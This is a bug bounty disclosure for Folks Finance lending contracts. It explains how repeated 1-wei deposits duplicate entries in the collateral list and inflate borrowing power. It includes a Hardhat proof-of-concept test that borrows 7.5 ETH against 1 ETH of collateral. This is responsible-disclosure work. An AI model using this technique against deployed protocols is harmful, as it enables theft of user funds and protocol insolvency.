# Boost \_ Folks Finance 33816 - \[Smart Contract - Critical] Attacker can get unlimited loan for some m

Submitted on Tue Jul 30 2024 02:49:29 GMT-0400 (Atlantic Standard Time) by @OxAnmol for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33816

Report type: Smart Contract

Report severity: Critical

Target: <https://sepolia.etherscan.io/address/0x8Aac7fA5B2d0c7Ca4f1610bB43CF0d62A670Fa14>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Protocol insolvency

## Description

## Brief/Intro

`UserLoanLogic:getLoanLiquidity` is used in the function `isLoanOverCollateralized` to calculate the user's available collateral value when they borrow or withdraw. The user's asset value depends on the length of the `userLoan.colsPool[]`, which can be manipulated with minimal deposits. Because of this, collateral will be calculated incorrectly, leading to undesirable borrowing.

## Vulnerability Details

There is no restriction on the minimal amount of collateral deposit for users. When a user deposits tokens, the `fAmount` is calculated based on the `depositInterestIndex`. If this index is greater than the user-provided amount \* 1e18 (which is generally always the case), then the `fAmount` is rounded down to 0.

If the `fAmount` is zero, based on the logic of `UserLoanLogic:increaseCollateral`, the loanId (deposit token) is pushed to the `userLoan.colsPool[]`.

```solidity
function increaseCollateral(LoanManagerState.UserLoan storage loan, uint8 poolId, uint256 fAmount) external {
    // if the balance was previously zero, add pool to list of user loan collaterals
    if (loan.collaterals[poolId].balance == 0) loan.colPools.push(poolId);

    loan.collaterals[poolId].balance += fAmount;
}

```

Now, when a user’s `fAmount` is non-zero, it is also pushed to the `colsPool[]`, and `loan.collaterals[poolId].balance` is incremented to a non-zero value.

When the user goes to borrow, their collateral value is calculated based on the balance stored in the mapping by looping through the `userLoan.colsPool[]`. This will inflate the value of the user's collaterals because `colsPool[]` may contain the same `poolId` multiple times, and for each `poolId`, the collateral value is calculated assuming they all have a non-zero amount stored in the `loan.collaterals[poolId].balance` mapping.

Because of this, a user can borrow a large amount and potentially drain the whole pool with this inflated collateral value for some minimal deposit.

<https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/logic/UserLoanLogic.sol#L283C4-L291C6>

```solidity
 function isLoanOverCollateralized(
        LoanManagerState.UserLoan storage loan,
        mapping(uint8 poolId => IHubPool) storage pools,
        mapping(uint8 poolId => LoanManagerState.LoanPool) storage loanPools,
        IOracleManager oracleManager
    ) internal view returns (bool) {
        DataTypes.LoanLiquidityParams memory loanLiquidity = getLoanLiquidity(loan, pools, loanPools, oracleManager);
        return loanLiquidity.effectiveCollateralValue >= loanLiquidity.effectiveBorrowValue;
    }
```

<https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/logic/UserLoanLogic.sol#L216C4-L275C6>

```solidity
 function getLoanLiquidity(
        LoanManagerState.UserLoan storage loan,
        mapping(uint8 => IHubPool) storage pools,
        mapping(uint8 => LoanManagerState.LoanPool) storage loanPools,
        IOracleManager oracleManager
    ) internal view returns (DataTypes.LoanLiquidityParams memory loanLiquidity) {
        // declare common variables
        uint256 effectiveValue;
        uint256 balance;
        uint8 poolId;
        uint256 poolsLength;
        DataTypes.PriceFeed memory priceFeed;

        // calc effective collateral value
        poolsLength = loan.colPools.length;
        for (uint8 i = 0; i < poolsLength; i++) {
            poolId = loan.colPools[i];

            balance = loan.collaterals[poolId].balance.toUnderlingAmount(
                pools[poolId].getUpdatedDepositInterestIndex()
            );
            priceFeed = oracleManager.processPriceFeed(poolId);
            effectiveValue += MathUtils.calcCollateralAssetLoanValue(
                balance,
                priceFeed.price,
                priceFeed.decimals,
                loanPools[poolId].collateralFactor
            );
        }
        loanLiquidity.effectiveCollateralValue = effectiveValue;

        // calc effective borrow value
        effectiveValue = 0;
        poolsLength = loan.borPools.length;
        for (uint8 i = 0; i < poolsLength; i++) {
            poolId = loan.borPools[i];

            LoanManagerState.UserLoanBorrow memory loanBorrow = loan.borrows[poolId];
            balance = loanBorrow.lastStableUpdateTimestamp > 0
                ? calcStableBorrowBalance(
                    loanBorrow.balance,
                    loanBorrow.lastInterestIndex,
                    loanBorrow.stableInterestRate,
                    block.timestamp - loanBorrow.lastStableUpdateTimestamp
                )
                : calcVariableBorrowBalance(
                    loanBorrow.balance,
                    loanBorrow.lastInterestIndex,
                    pools[poolId].getUpdatedVariableBorrowInterestIndex()
                );
            priceFeed = oracleManager.processPriceFeed(poolId);
            effectiveValue += MathUtils.calcBorrowAssetLoanValue(
                balance,
                priceFeed.price,
                priceFeed.decimals,
                loanPools[poolId].borrowFactor
            );
        }
        loanLiquidity.effectiveBorrowValue = effectiveValue;
    }
```

## Attack flow

1. User deposit 1 wei or 0 (if the token doesn’t revert on 0 deposits) 10 times(can be any number).
2. Because of [toFAmount](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/libraries/MathUtils.sol#L252) calculation the 1 wei is rounded to 0 fAmount.
3. As the amount is 0 the poolId is pushed to `userLoan.colsPool[]` , this array will now contain \[poolId…n] and `loan.collaterals[poolId].balance` is 0.
4. Now the attacker deposit some actual amount let’s say 1e18(ETH). `userLoan.colsPool[]` now contains \[poolId…n + poolId] and `loan.collaterals[poolId].balance` is updated to 1e18(1 ETH).
5. user now and borrow 7.5 ETH with just 1 ETH deposit, if we only considered the 10 empty deposits.
6. This happend because in `getLoanLiquidity` , protocol is assuming that colsPool\[] only contains unique poolId .

As you can see that attacker have a power to drain almost all the available funds in the system with minimal collateral deposit.

## Impact Details

This attack can lead to the loss of all the user funds and lead protocol to insolvency.

## References

<https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/logic/UserLoanLogic.sol#L22>

<https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/logic/UserLoanLogic.sol#L230C7-L244C10>

## Proof of concept

Here is a simple POC to demonstrate how the attack flow mentioned above works.

To run this POC, create new file inside `test/hub` and paste the code.

```js
import { expect } from "chai";
import { ethers } from "hardhat";
import { PANIC_CODES } from "@nomicfoundation/hardhat-chai-matchers/panic";
import { loadFixture, reset, time } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import {
  LiquidationLogic__factory,
  LoanManagerLogic__factory,
  LoanManager__factory,
  LoanPoolLogic__factory,
  MockHubPool__factory,
  MockOracleManager__factory,
  RewardLogic__factory,
  UserLoanLogic__factory,
} from "../../typechain-types";
import { BYTES32_LENGTH, convertStringToBytes, getAccountIdBytes, getEmptyBytes, getRandomBytes } from "../utils/bytes";
import { SECONDS_IN_DAY, SECONDS_IN_HOUR, getLatestBlockTimestamp, getRandomInt } from "../utils/time";
import { UserLoanBorrow, UserLoanCollateral } from "./libraries/assets/loanData";
import { getNodeOutputData } from "./libraries/assets/oracleData";
import {
  calcAverageStableRate,
  calcBorrowBalance,
  calcBorrowInterestIndex,
  calcReserveCol,
  calcStableInterestRate,
  convToCollateralFAmount,
  convToRepayBorrowAmount,
  convToSeizedCollateralAmount,
  toFAmount,
  toUnderlingAmount,
} from "./utils/formulae";

describe("Unlimited Borrow", () => {
  const DEFAULT_ADMIN_ROLE = getEmptyBytes(BYTES32_LENGTH);
  const LISTING_ROLE = ethers.keccak256(convertStringToBytes("LISTING"));
  const ORACLE_ROLE = ethers.keccak256(convertStringToBytes("ORACLE"));
  const HUB_ROLE = ethers.keccak256(convertStringToBytes("HUB"));

  async function deployLoanManagerFixture() {
    const [admin, hub, user, ...unusedUsers] = await ethers.getSigners();

    // libraries
    const userLoanLogic = await new UserLoanLogic__factory(user).deploy();
    const userLoanLogicAddress = await userLoanLogic.getAddress();
    const loanPoolLogic = await new LoanPoolLogic__factory(user).deploy();
    const loanPoolLogicAddress = await loanPoolLogic.getAddress();
    const liquidationLogic = await new LiquidationLogic__factory(
      {
        ["contracts/hub/logic/UserLoanLogic.sol:UserLoanLogic"]: userLoanLogicAddress,
      },
      user
    ).deploy();
    const liquidationLogicAddress = await liquidationLogic.getAddress();
    const loanManagerLogic = await new LoanManagerLogic__factory(
      {
        ["contracts/hub/logic/UserLoanLogic.sol:UserLoanLogic"]: userLoanLogicAddress,
        ["contracts/hub/logic/LoanPoolLogic.sol:LoanPoolLogic"]: loanPoolLogicAddress,
        ["contracts/hub/logic/LiquidationLogic.sol:LiquidationLogic"]: liquidationLogicAddress,
      },
      user
    ).deploy();
    const loanManagerLogicAddress = await loanManagerLogic.getAddress();
    const rewardLogic = await new RewardLogic__factory(user).deploy();
    const rewardLogicAddress = await rewardLogic.getAddress();

    const libraries = {
      userLoanLogic,
      loanPoolLogic,
      liquidationLogic,
      loanManagerLogic,
      rewardLogic,
    };

    // deploy contract
    const oracleManager = await new MockOracleManager__factory(user).deploy();
    const loanManager = await new LoanManager__factory(
      {
        ["contracts/hub/logic/LoanManagerLogic.sol:LoanManagerLogic"]: loanManagerLogicAddress,
        ["contracts/hub/logic/RewardLogic.sol:RewardLogic"]: rewardLogicAddress,
      },
      user
    ).deploy(admin, oracleManager);

    // set hub role
    await loanManager.connect(admin).grantRole(HUB_ROLE, hub);

    // common
    const loanManagerAddress = await loanManager.getAddress();

    return {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
    };
  }

  async function createLoanTypeFixture() {
    const { admin, hub, user, unusedUsers, loanManager, loanManagerAddress, oracleManager, libraries } =
      await loadFixture(deployLoanManagerFixture);

    // create loan type
    const loanTypeId = 1;
    const loanTargetHealth = BigInt(1.05e4); //
    await loanManager.connect(admin).createLoanType(loanTypeId, loanTargetHealth);

    return {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      loanTypeId,
      loanTargetHealth,
    };
  }

  async function addPoolsFixture() {
    const { admin, hub, user, unusedUsers, loanManager, loanManagerAddress, oracleManager, libraries, loanTypeId } =
      await loadFixture(createLoanTypeFixture);

    // prepare pools
    const usdcPoolId = 1;
    const usdcPool = await new MockHubPool__factory(user).deploy("Folks USD Coin", "fUSDC", usdcPoolId);
    const ethPoolId = 2;
    const ethPool = await new MockHubPool__factory(user).deploy("Folks Ethereum", "fETH", ethPoolId);

    // add pools
    await loanManager.connect(admin).addPool(usdcPool);
    await loanManager.connect(admin).addPool(ethPool);

    return {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      loanTypeId,
      usdcPoolId,
      usdcPool,
      ethPoolId,
      ethPool,
    };
  }
  async function addPoolToLoanTypeFixture() {
    const {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      loanTypeId,
      usdcPoolId,
      usdcPool,
      ethPoolId,
      ethPool,
    } = await loadFixture(addPoolsFixture);

    // add pools to loan type
    const rewardCollateralSpeed = BigInt(0);
    const rewardBorrowSpeed = BigInt(0);
    const rewardMinimumAmount = BigInt(1e18);
    const collateralCap = BigInt(20e6);
    const borrowCap = BigInt(10e6);

    const usdcCollateralFactor = BigInt(0.8e4);
    const usdcBorrowFactor = BigInt(1e4);
    const usdcLiquidationBonus = BigInt(0.04e4);
    const usdcLiquidationFee = BigInt(0.1e4);

    const ethCollateralFactor = BigInt(0.7e4);
    const ethBorrowFactor = BigInt(1e4);
    const ethLiquidationBonus = BigInt(0.06e4);
    const ethLiquidationFee = BigInt(0.1e4);

    const pools = {
      USDC: {
        poolId: usdcPoolId,
        pool: usdcPool,
        rewardCollateralSpeed,
        rewardBorrowSpeed,
        rewardMinimumAmount,
        collateralCap,
        borrowCap,
        collateralFactor: usdcCollateralFactor,
        borrowFactor: usdcBorrowFactor,
        liquidationBonus: usdcLiquidationBonus,
        liquidationFee: usdcLiquidationFee,
        tokenDecimals: BigInt(6),
      },
      ETH: {
        poolId: ethPoolId,
        pool: ethPool,
        rewardCollateralSpeed,
        rewardBorrowSpeed,
        rewardMinimumAmount,
        collateralCap,
        borrowCap,
        collateralFactor: ethCollateralFactor,
        borrowFactor: ethBorrowFactor,
        liquidationBonus: ethLiquidationBonus,
        liquidationFee: ethLiquidationFee,
        tokenDecimals: BigInt(18),
      },
    };

    await loanManager
      .connect(admin)
      .addPoolToLoanType(
        loanTypeId,
        usdcPoolId,
        usdcCollateralFactor,
        collateralCap,
        usdcBorrowFactor,
        borrowCap,
        usdcLiquidationBonus,
        usdcLiquidationFee,
        rewardCollateralSpeed,
        rewardBorrowSpeed,
        rewardMinimumAmount
      );
    await loanManager
      .connect(admin)
      .addPoolToLoanType(
        loanTypeId,
        ethPoolId,
        ethCollateralFactor,
        collateralCap,
        ethBorrowFactor,
        borrowCap,
        ethLiquidationBonus,
        ethLiquidationFee,
        rewardCollateralSpeed,
        rewardBorrowSpeed,
        rewardMinimumAmount
      );

    return {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      loanTypeId,
      pools,
    };
  }
  /* ---------------------------- CREATE USER LOAN ---------------------------- */
  async function createUserLoanFixture() {
    const {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      loanTypeId,
      pools,
    } = await loadFixture(addPoolToLoanTypeFixture);

    // create user loan
    const loanId = getRandomBytes(BYTES32_LENGTH);
    const accountId = getAccountIdBytes("ACCOUNT_ID");
    const loanName = getRandomBytes(BYTES32_LENGTH);
    const createUserLoan = await loanManager.connect(hub).createUserLoan(loanId, accountId, loanTypeId, loanName);

    return {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      createUserLoan,
      loanTypeId,
      pools,
      loanId,
      accountId,
      loanName,
    };
  }
  /* ----------------------------- DESPOSIT 1 WEI 3 times ----------------------------- */

  async function depositZeroTenTimesOneEtherOnceFixture() {
    const {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      loanTypeId,
      pools,
      loanId,
      accountId,
    } = await loadFixture(createUserLoanFixture);

    // prepare deposit
    let depositAmount = BigInt(1); // We can set any amount < depositInterestIndex

    //  function toFAmount(uint256 underlyingAmount, uint256 depositInterestIndexAtT) internal pure returns (uint256) {
    //     return underlyingAmount.mulDiv(ONE_18_DP, depositInterestIndexAtT);
    // }

    let depositFAmount = (depositAmount * BigInt(1e18)) / BigInt(1.2e18); // 0 -> base d on how the actual calculation in done - ref above function from mathUtils

    const depositInterestIndex = BigInt(1.2e18);
    const ethPrice = BigInt(3000e18);
    await pools.ETH.pool.setDepositPoolParams({
      fAmount: depositFAmount,
      depositInterestIndex,
      priceFeed: { price: ethPrice, decimals: pools.ETH.tokenDecimals },
    });
    /* --------------------------- DEPOSIT 0 TEN TIMES -------------------------- */
    for (let i = 0; i < 10; i++) {
      await loanManager.connect(hub).deposit(loanId, accountId, pools.ETH.poolId, depositAmount);
    }

    /* -------------------- userLoans.colsPool = [ETH, ETH, ETH, ETH, ETH, ETH, ETH, ETH, ETH, ETH] -------------------- */

    /* ----------------------------- DEPOSIT 1 ETHER ---------------------------- */

    depositAmount = BigInt(1e18); // 1 ETHER
    depositFAmount = depositAmount;
    await pools.ETH.pool.setDepositPoolParams({
      fAmount: depositFAmount,
      depositInterestIndex,
      priceFeed: { price: ethPrice, decimals: pools.ETH.tokenDecimals },
    });

    // deposit into eth pool
    const depositOneEther = await loanManager.connect(hub).deposit(loanId, accountId, pools.ETH.poolId, depositAmount);

    return {
      admin,
      hub,
      user,
      unusedUsers,
      loanManager,
      loanManagerAddress,
      oracleManager,
      libraries,
      depositOneEther,
      loanTypeId,
      pools,
      loanId,
      accountId,
      depositAmount,
      depositFAmount,
    };
  }

  after(async () => {
    await reset();
  });

  describe("Attack", () => {
    it.only("Should perform a fantastic attack to drain all the collateral from system", async () => {
      const {
        admin,
        hub,
        user,
        unusedUsers,
        loanManager,
        loanManagerAddress,
        oracleManager,
        libraries,
        depositOneEther,
        loanTypeId,
        pools,
        loanId,
        accountId,
        depositAmount,
        depositFAmount,
      } = await loadFixture(depositZeroTenTimesOneEtherOnceFixture);

      // set prices
      const ethNodeOutputData = getNodeOutputData(BigInt(3000e18));
      await oracleManager.setNodeOutput(pools.ETH.poolId, pools.ETH.tokenDecimals, ethNodeOutputData);

      // prepare borrow
      const variableInterestIndex = BigInt(1.2e18); // No interest
      const stableInterestRate = BigInt(0);
      await pools.ETH.pool.setBorrowPoolParams({ variableInterestIndex, stableInterestRate });
      await pools.ETH.pool.setUpdatedVariableBorrowInterestIndex(variableInterestIndex);

      /* ----------------------------- BORROW 7.5 ETH ----------------------------- */

      const borrowAmount = BigInt(7.5e18);
      const borrow = await loanManager
        .connect(hub)
        .borrow(loanId, accountId, pools.ETH.poolId, borrowAmount, BigInt(0));
    });
  });
});

```
